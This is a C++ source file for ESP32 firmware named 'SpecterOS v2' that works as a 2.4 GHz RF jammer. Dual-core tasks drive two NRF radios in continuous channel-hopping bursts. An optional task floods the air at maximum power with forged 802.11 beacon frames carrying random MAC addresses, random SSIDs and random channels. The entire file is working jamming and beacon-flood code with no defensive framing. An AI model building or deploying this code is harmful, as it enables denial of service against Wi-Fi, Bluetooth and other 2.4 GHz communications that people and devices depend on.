/* ═══════════════════════════════════════════════════════════
   SpecterOS v2 — ESP32 2.4 GHz RF Jammer
   jammer.cpp — dual-core NRF tasks + optional ESP32 WiFi beacon flood
   ═══════════════════════════════════════════════════════════ */

#include "jammer.h"
#include "../config.h"
#include "../radio/radio.h"
#include "../interface/ui.h"

#include <esp_random.h>
#if ENABLE_WIFI_FLOOD
#include <esp_wifi.h>
#endif

volatile OperationMode current_Mode = WiFi_MODULE;
volatile Operation current      = DEACTIVE_MODE;
bool               wifiFloodOn  = ENABLE_WIFI_FLOOD;

volatile uint32_t hopsA = 0;
volatile uint32_t hopsB = 0;
volatile uint32_t hopsW = 0;

#define BURST_COUNT 8

// ── Button actions ───────────────────────────────────────────
void jammerToggle() {
  if (current == ACTIVE_MODE) {
    current = DEACTIVE_MODE;
    vTaskDelay(pdMS_TO_TICKS(5));
    radioDeactivate();
  } else {
    radioActivate();
    current = ACTIVE_MODE;
  }
  uiInvalidate();
  Serial.print(F("[*] "));
  Serial.print(kMenuLabels[(int)current_Mode]);
  Serial.println(current == ACTIVE_MODE ? "  ->  ACTIVE" : "  ->  OFF");
}

void jammerNextMode() {
  int idx = (int)current_Mode;
  idx = (idx == kMenuCount - 1) ? 0 : (idx + 1);
  current_Mode = (OperationMode)idx;
  uiInvalidate();
  Serial.print(F("[>] "));
  Serial.println(kMenuLabels[idx]);
}

void jammerPrevMode() {
  int idx = (int)current_Mode;
  idx = (idx == 0) ? (kMenuCount - 1) : (idx - 1);
  current_Mode = (OperationMode)idx;
  uiInvalidate();
  Serial.print(F("[<] "));
  Serial.println(kMenuLabels[idx]);
}

// ── NRF Task: RadioA on Core 0 (VSPI) ───────────────────────
static void jamTaskA(void* param) {
  uint16_t yc = 0;
  for (;;) {
    if (current == ACTIVE_MODE && radioA_ok) {
      for (int b = 0; b < BURST_COUNT; b++)
        radioHopA();
      hopsA += BURST_COUNT;
      if (++yc >= 100) { yc = 0; vTaskDelay(1); }
    } else {
      yc = 0;
      vTaskDelay(1);
    }
  }
}

// ── NRF Task: RadioB on Core 1 (HSPI) ───────────────────────
static void jamTaskB(void* param) {
  uint16_t yc = 0;
  for (;;) {
    if (current == ACTIVE_MODE && radioB_ok) {
      for (int b = 0; b < BURST_COUNT; b++)
        radioHopB();
      hopsB += BURST_COUNT;
      if (++yc >= 100) { yc = 0; vTaskDelay(1); }
    } else {
      yc = 0;
      vTaskDelay(1);
    }
  }
}

#if ENABLE_WIFI_FLOOD
// ── ESP32 WiFi beacon flood (third transmitter) ─────────────
static uint8_t beacon_frame[] = {
  0x80, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00,
  0x31, 0x04,
  0x00, 0x08,
  'S', 'P', 'E', 'C', 'T', 'E', 'R', '!',
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
  0x03, 0x01, 0x01,
};

static void wifiJamTask(void* param) {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);

  wifi_config_t ap = {};
  memcpy(ap.ap.ssid, "SPECTER", 7);
  ap.ap.ssid_len = 7;
  ap.ap.channel = 1;
  ap.ap.max_connection = 0;
  ap.ap.ssid_hidden = 1;
  esp_wifi_set_config(WIFI_IF_AP, &ap);
  esp_wifi_start();
  esp_wifi_set_max_tx_power(84);

  uint8_t ch = 1;
  uint32_t cnt = 0;

  Serial.println(F("[+] WiFi flood  ON  (ESP32 radio)"));

  for (;;) {
    if (current == ACTIVE_MODE && wifiFloodOn) {
      uint32_t r = esp_random();
      beacon_frame[10] = r;
      beacon_frame[11] = r >> 8;
      beacon_frame[12] = r >> 16;
      beacon_frame[16] = beacon_frame[10];
      beacon_frame[17] = beacon_frame[11];
      beacon_frame[18] = beacon_frame[12];

      for (int i = 0; i < 8; i++)
        beacon_frame[38 + i] = 'A' + (esp_random() % 26);

      beacon_frame[58] = ch;

      esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
      hopsW++;

      if (++cnt % 50 == 0) {
        ch = 1 + (esp_random() % 13);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      }
    } else {
      vTaskDelay(10);
    }
  }
}
#endif // ENABLE_WIFI_FLOOD

void jammerStart() {
  xTaskCreatePinnedToCore(jamTaskA, "jamA", 4096, NULL, 1, NULL, 0);
  xTaskCreatePinnedToCore(jamTaskB, "jamB", 4096, NULL, 1, NULL, 1);
#if ENABLE_WIFI_FLOOD
  xTaskCreatePinnedToCore(wifiJamTask, "wifiJ", 4096, NULL, 1, NULL, 0);
#endif
}

